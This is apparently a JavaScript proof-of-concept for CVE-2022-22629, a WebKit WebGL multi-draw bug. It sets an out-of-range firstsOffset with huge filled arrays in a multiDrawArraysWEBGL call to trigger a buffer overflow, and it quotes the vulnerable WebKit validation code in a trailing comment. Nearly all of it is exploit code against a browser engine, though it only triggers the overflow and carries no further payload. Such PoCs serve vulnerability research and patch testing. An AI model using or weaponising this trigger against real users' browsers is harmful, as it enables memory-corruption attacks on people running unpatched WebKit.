// CVE-2022-22629 PoC

const canvas = document.querySelector("#glCanvas");
// Initialize the GL context
document.body.appendChild(canvas);
const gl = canvas.getContext("webgl2");
gl.clearColor(0, 0, 0, 1);
// Only continue if WebGL2 is available and working
if (gl) {
  console.log("webgl2 initialized");
}

var ext = gl.getExtension("WEBGL_multi_draw");

function build_link_program() {
  var vsSource = `#version 300 es
    #extension GL_ANGLE_multi_draw : require
    layout (location=0) in vec4 position;
    layout (location=1) in vec3 color;
        
    out vec3 vColor;
    out float sum;
    
    void main() {
        gl_Position = vec4(gl_DrawID, 0, 0, 1);
    }`;

  var fsSource = `#version 300 es
    precision highp float;
    in vec3 vColor;
    out vec4 fragColor;
  
    void main() {
        fragColor = vec4(vColor, 1.0);
    }`;

  var vertexShader = gl.createShader(gl.VERTEX_SHADER);
  gl.shaderSource(vertexShader, vsSource);
  gl.compileShader(vertexShader);

  if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
    console.log(gl.getShaderInfoLog(vertexShader));
  }

  var fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
  gl.shaderSource(fragmentShader, fsSource);
  gl.compileShader(fragmentShader);

  if (!gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS)) {
    console.log(gl.getShaderInfoLog(fragmentShader));
  }

  var program = gl.createProgram();
  gl.attachShader(program, vertexShader);
  gl.attachShader(program, fragmentShader);

  gl.linkProgram(program);

  if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
    console.log(gl.getProgramInfoLog(program));
  }
  return program;
}

var program = build_link_program();

if(program){
  console.log("Program linked");
}

gl.useProgram(program);


// multiDrawArrays variant.
console.log("Calling the function multiDrawArraysWEBGL");
var size = 0x5F5E100; 
let firstsList = new Int32Array(size);
firstsList.fill(0x41);
let countsList = new Int32Array(size);
countsList.fill(0x42);
var drawcount = size - 1;
var firstsOffset = drawcount; //Maximum offset in the patch allowed is size-drawcount. We can draw more than that in vulnerable commit causing buffer overflow. 
var countsoffset = 0;
var temp = ext.multiDrawArraysWEBGL(
  gl.TRIANGLES,
  firstsList,
  firstsOffset,
  countsList,
  countsoffset,
  drawcount
);

gl.deleteProgram(program);
console.log("Program unlinked");


/*
// https://github.com/WebKit/WebKit/blob/03456a7a629de0ed610ee2914bb6a725a5e73cd9/Source/WebCore/html/canvas/WebGLMultiDraw.cpp#L131

bool WebGLMultiDraw::validateOffset(const char* functionName, const char* outOfBoundsDescription, GCGLsizei size, GCGLuint offset, GCGLsizei drawcount)
{                   
    if (drawcount > size) {
        m_context->synthesizeGLError(GraphicsContextGL::INVALID_OPERATION, functionName, "drawcount out of bounds");
        return false;
    }
                                        
    if (offset >= static_cast<GCGLuint>(size)) {
        m_context->synthesizeGLError(GraphicsContextGL::INVALID_OPERATION, functionName, outOfBoundsDescription);
        return false;
    }

    return true;
}

void WebGLMultiDraw::multiDrawArraysWEBGL(GCGLenum mode, Int32List firstsList, GCGLuint firstsOffset, Int32List countsList, GCGLuint countsOffset, GCGLsizei drawcount)
{
    if (!m_context || m_context->isContextLost())
        return;

    if (!validateDrawcount("multiDrawArraysWEBGL", drawcount)
        || !validateOffset("multiDrawArraysWEBGL", "firstsOffset out of bounds", firstsList.length(), firstsOffset, drawcount)
        || !validateOffset("multiDrawArraysWEBGL", "countsOffset out of bounds", countsList.length(), countsOffset, drawcount)) {
        return;
    }

    m_context->graphicsContextGL()->multiDrawArraysANGLE(mode, makeSpanWithOffset(firstsList, firstsOffset), makeSpanWithOffset(countsList, countsOffset), drawcount);
 }

 */
 